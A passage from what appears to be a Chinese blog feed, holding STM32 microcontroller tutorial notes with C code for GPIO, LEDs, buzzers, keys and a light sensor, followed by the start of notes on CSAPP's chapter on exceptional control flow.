alt="image-20240218053705572"></p><p><strong>GPIO位结构</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218053810264.png" alt="image-20240218053810264"></p><ul><li>推挽模式（强推输出模式）：P-MOS，N-MOS均有效，STM32对IO口有绝对的控制权。</li><li>开漏模式：只有N-MOS工作，只有低电平有驱动能力，可以作为通信协议的驱动方式，输出5V电平信号</li><li>关闭模式：输出关闭，端口的电平由外部信号控制</li></ul><p><strong>GPIO模式</strong></p><div class="table-container"><table><thead><tr><th><strong>模式名称</strong></th><th><strong>性质</strong></th><th><strong>特征</strong></th></tr></thead><tbody><tr><td>浮空输入</td><td>数字输入</td><td>可读取引脚电平，若引脚悬空，则电平不确定</td></tr><tr><td>上拉输入</td><td>数字输入</td><td>可读取引脚电平，内部连接上拉电阻，悬空时默认高电平</td></tr><tr><td>下拉输入</td><td>数字输入</td><td>可读取引脚电平，内部连接下拉电阻，悬空时默认低电平</td></tr><tr><td>模拟输入</td><td>模拟输入</td><td>GPIO无效，引脚直接接入内部ADC</td></tr><tr><td>开漏输出</td><td>数字输出</td><td>可输出引脚电平，高电平为高阻态，低电平接VSS</td></tr><tr><td>推挽输出</td><td>数字输出</td><td>可输出引脚电平，高电平接VDD，低电平接VSS</td></tr><tr><td>复用开漏输出</td><td>数字输出</td><td>由片上外设控制，高电平为高阻态，低电平接VSS</td></tr><tr><td>复用推挽输出</td><td>数字输出</td><td>由片上外设控制，高电平接VDD，低电平接VSS</td></tr></tbody></table></div><ul><li><p>LED：发光二极管，正向通电点亮，反向通电不亮</p></li><li><p>有源蜂鸣器：内部自带振荡源，将正负极接上直流电压即可持续发声，频率固定</p></li><li><p>无源蜂鸣器：内部不带振荡源，需要控制器提供振荡脉冲才可发声，调整提供振荡脉冲的频率，可发出不同频率的声音</p></li></ul><h4 id="LED"><a href="#LED" class="headerlink" title="LED"></a>LED</h4><p><strong>硬件电路</strong></p><p>LED一般采用方式1</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218055754420.png" alt="image-20240218055754420"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span>                  <span class="comment">// Device header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Mode =  GPIO_Mode_Out_PP;<span class="comment">//推挽输出模式</span></span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_0;<span class="comment">//设置结构体对应的引脚</span></span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;<span class="comment">//频率</span></span><br><span class="line">GPIO_Init(GPIOA, &amp;GPIO_InitStructure);<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//GPIO_ResetBits(GPIOA, GPIO_Pin_0);低电平</span></span><br><span class="line"><span class="comment">//GPIO_SetBits(GPIOA, GPIO_Pin_0);高电平</span></span><br><span class="line"><span class="comment">//  GPIO_WriteBit(GPIOA, GPIO_Pin_0, Bit_SET);高电平</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//GPIO_WriteBit(GPIOA, GPIO_Pin_0, Bit_RESET);低电平</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">GPIO_WriteBit(GPIOA, GPIO_Pin_0, (BitAction)<span class="number">0</span>);</span><br><span class="line">Delay_ms(<span class="number">25</span>);</span><br><span class="line">GPIO_WriteBit(GPIOA, GPIO_Pin_0, (BitAction)<span class="number">1</span>);</span><br><span class="line">Delay_ms(<span class="number">25</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="LED流水灯"><a href="#LED流水灯" class="headerlink" title="LED流水灯"></a>LED流水灯</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span>                  <span class="comment">// Device header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Mode =  GPIO_Mode_Out_PP;<span class="comment">//推挽输出</span></span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_All;</span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">GPIO_Init(GPIOA, &amp;GPIO_InitStructure);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">GPIO_Write(GPIOA,~(<span class="number">0x0001</span>&lt;&lt;i));</span><br><span class="line">Delay_ms(<span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>恭喜您达成成就~——点灯大师！</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218073416831.png" alt="image-20240218073416831"></p><h4 id="蜂鸣器"><a href="#蜂鸣器" class="headerlink" title="蜂鸣器"></a>蜂鸣器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span>                  <span class="comment">// Device header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Mode =  GPIO_Mode_Out_PP;<span class="comment">//推挽输出</span></span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_12;</span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">GPIO_Init(GPIOB, &amp;GPIO_InitStructure);</span><br><span class="line"></span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure1;</span><br><span class="line">GPIO_InitStructure1.GPIO_Mode =  GPIO_Mode_Out_PP;<span class="comment">//推挽输出</span></span><br><span class="line">GPIO_InitStructure1.GPIO_Pin = GPIO_Pin_All;</span><br><span class="line">GPIO_InitStructure1.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">GPIO_Init(GPIOA, &amp;GPIO_InitStructure1);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">GPIO_SetBits(GPIOB, GPIO_Pin_12);</span><br><span class="line">Delay_ms(<span class="number">100</span>);</span><br><span class="line">GPIO_Write(GPIOA,~(<span class="number">0x0001</span>&lt;&lt;i));</span><br><span class="line">GPIO_ResetBits(GPIOB, GPIO_Pin_12);</span><br><span class="line">Delay_ms(<span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="按键控制LED"><a href="#按键控制LED" class="headerlink" title="按键控制LED"></a>按键控制LED</h4><p><strong>硬件电路</strong></p><ul><li>传感器模块：传感器元件（光敏电阻/热敏电阻/红外接收管等）的电阻随外界模拟量的变化而变化，通过与定值电阻分压即可得到模拟电压出，再通过电压比较器进行二值化即可得到数字电压输出</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218165859378.png" alt="image-20240218165859378"></p><p>按键一般用上两种方式</p><p>左边两种接法必须要求引脚是上拉或下拉输出 </p><p>右边两种接法允许引脚是浮空输入的模式</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218170224303.png" alt="image-20240218170224303"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*key.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Key_Init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB,ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_1 | GPIO_Pin_11;</span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;<span class="comment">//对输入无影响</span></span><br><span class="line">GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IPU ;<span class="comment">//上拉输入</span></span><br><span class="line">GPIO_Init(GPIOB, &amp;GPIO_InitStructure);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">Key_GetNum</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> KeyNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(!GPIO_ReadInputDataBit(GPIOB,GPIO_Pin_1))<span class="comment">//读输入数据寄存器值</span></span><br><span class="line">&#123;</span><br><span class="line">Delay_ms(<span class="number">50</span>);</span><br><span class="line"><span class="keyword">while</span>(GPIO_ReadInputDataBit(GPIOB, GPIO_Pin_1));<span class="comment">//消抖</span></span><br><span class="line">Delay_ms(<span class="number">50</span>);</span><br><span class="line">KeyNum=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!GPIO_ReadInputDataBit(GPIOB,GPIO_Pin_11))</span><br><span class="line">&#123;</span><br><span class="line">Delay_ms(<span class="number">50</span>);</span><br><span class="line"><span class="keyword">while</span>(GPIO_ReadInputDataBit(GPIOB, GPIO_Pin_11));</span><br><span class="line">Delay_ms(<span class="number">50</span>);</span><br><span class="line">KeyNum=<span class="number">11</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> KeyNum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*key.c*/</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">/*led.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">LED_Init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA,ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_1 | GPIO_Pin_2;</span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP ;</span><br><span class="line">GPIO_Init(GPIOA, &amp;GPIO_InitStructure);</span><br><span class="line">GPIO_SetBits(GPIOA, GPIO_Pin_1 | GPIO_Pin_2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">LED_ON</span><span class="params">(<span class="type">uint16_t</span> Pin)</span><span class="comment">//开启</span></span><br><span class="line">&#123;</span><br><span class="line">GPIO_ResetBits(GPIOA, Pin );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">LED_OFF</span><span class="params">(<span class="type">uint16_t</span> Pin)</span><span class="comment">//关闭</span></span><br><span class="line">&#123;</span><br><span class="line">GPIO_SetBits(GPIOA, Pin );</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">LED2_TURN</span><span class="params">(<span class="type">void</span>)</span><span class="comment">//翻转</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!GPIO_ReadOutputDataBit(GPIOA,GPIO_Pin_2))<span class="comment">//读输出数据寄存器值</span></span><br><span class="line">GPIO_SetBits(GPIOA, GPIO_Pin_2);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">GPIO_ResetBits(GPIOA, GPIO_Pin_2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*led.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span>                  <span class="comment">// Device header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;LED.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Key.h&quot;</span></span></span><br><span class="line"><span class="type">uint8_t</span> Key;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">LED_Init();</span><br><span class="line">Key_Init();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">Key = Key_GetNum();</span><br><span class="line"><span class="keyword">if</span>(Key == <span class="number">11</span>)</span><br><span class="line">LED2_TURN();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(Key == <span class="number">1</span>)</span><br><span class="line">LED_ON(GPIO_Pin_1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">LED_OFF(GPIO_Pin_1);</span><br><span class="line">        Delay_ms(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="蜂鸣器-1"><a href="#蜂鸣器-1" class="headerlink" title="蜂鸣器"></a>蜂鸣器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span>                  <span class="comment">// Device header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Buzzer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;LightSensor.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Buzzer_Init();</span><br><span class="line">LightSensor_Init();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)<span class="comment">//被黑暗遮挡发出尖锐爆鸣声音</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(LightSensor_Get() == <span class="number">1</span>)</span><br><span class="line">Buzzer_ON();</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">Buzzer_OFF();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*LightSensor.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">LightSensor_Init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB,ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_13;</span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IPU ;</span><br><span class="line">GPIO_Init(GPIOB, &amp;GPIO_InitStructure);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">LightSensor_Get</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> GPIO_ReadInputDataBit(GPIOB, GPIO_Pin_13);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*LightSensor.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Buzzer.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Buzzer_Init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB,ENABLE);</span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_12;</span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP ;</span><br><span class="line">GPIO_Init(GPIOB, &amp;GPIO_InitStructure);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Buzzer_ON</span><span class="params">(<span class="type">void</span>)</span><span class="comment">//开启</span></span><br><span class="line">&#123;</span><br><span class="line">GPIO_ResetBits(GPIOB, GPIO_Pin_12);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Buzzer_OFF</span><span class="params">(<span class="type">void</span>)</span><span class="comment">//关闭</span></span><br><span class="line">&#123;</span><br><span class="line">GPIO_SetBits(GPIOB, GPIO_Pin_12);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Buzzer_TURN</span><span class="params">(<span class="type">void</span>)</span><span class="comment">//翻转</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!GPIO_ReadOutputDataBit(GPIOB,GPIO_Pin_12))<span class="comment">//读输出数据寄存器值</span></span><br><span class="line">GPIO_SetBits(GPIOB, GPIO_Pin_12);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">GPIO_ResetBits(GPIOB, GPIO_Pin_12);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Buzzer.c*/</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="OLED-调试模块"><a href="#OLED-调试模块" class="headerlink" title="OLED 调试模块"></a>OLED 调试模块</h3>]]></content>
      
      
      <categories>
          
          <category> 单片机 </category>
          
          <category> stm32单片机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单片机 </tag>
            
            <tag> stm32单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp第八章——异常控制流</title>
      <link href="/2024/02/13/csapp/%E7%AC%AC8%E7%AB%A0%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/"/>
      <url>/2024/02/13/csapp/%E7%AC%AC8%E7%AB%A0%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="异常控制流"><a href="#异常控制流" class="headerlink" title="异常控制流"></a>异常控制流</h1><p>现代系统通过使控制流发生突变来对系统状态的变化做出反应 。一般而言 ，我们把这些突变称为<code>异常控制流 (Exceptional Control Flow, ECF) 。</code></p><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>异常是异常控制流的一种形式，它一部分由<code>硬件</code>实现，一部分由<code>操作系统</code>实现。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240210180910491.png" alt="image-20240210180910491"></p><p>异常 (exception) 就是控制流中的突变，用来响应处理器状态中的某些变化。</p><p>当处理器检测到有事件发生时，它就会通过一张叫做<code>异常表 (exception table)</code>的跳转表，进行一个<code>间接过程调用（异常）</code>，到一个专门设计用来处理这类事件的操作系统子程序（异常处理程序 (exception handler)) 。</p><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240212222613370.png" alt="image-20240212222613370"></p><p>异常处理程序运行在<code>内核模式</code>下，这意味它们对所有的系统资源都有完全的访问权限。</p><h4 id="异常的类别"><a href="#异常的类别" class="headerlink" title="异常的类别"></a>异常的类别</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240210192934372.png" alt="image-20240210192934372"></p><blockquote><p>同步异步表示的结果的获取方式是主动获取还是被动接收；阻塞非阻塞表示的是获取这个动作是否可以立即返回不用等待。</p></blockquote><h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><p>中断是<code>异步</code>发生的， 是来自处理器外部的 I/0 设备的信号的结果。例如定时器计时结束后会向处理器发送一个中断。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215162205029.png" alt="image-20240215162205029"></p><h5 id="陷阱和系统调用"><a href="#陷阱和系统调用" class="headerlink" title="陷阱和系统调用"></a>陷阱和系统调用</h5><p>陷阱是有意的异常，是执行一条指令的结果 。如读文件（read），创建一个新的进程（fork）。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215163333455.png" alt="image-20240215163333455"></p><h5 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h5><p>故障由错误情况引起，它可能能够被故障处理程序修正。</p><p>一个经典的故障示例是<code>缺页异常</code>，当指令引用一个虚拟地址，而与该地址相对应的物理页面不在内存中，因此必须从磁盘中取出时，就会发生故障。</p><p><img 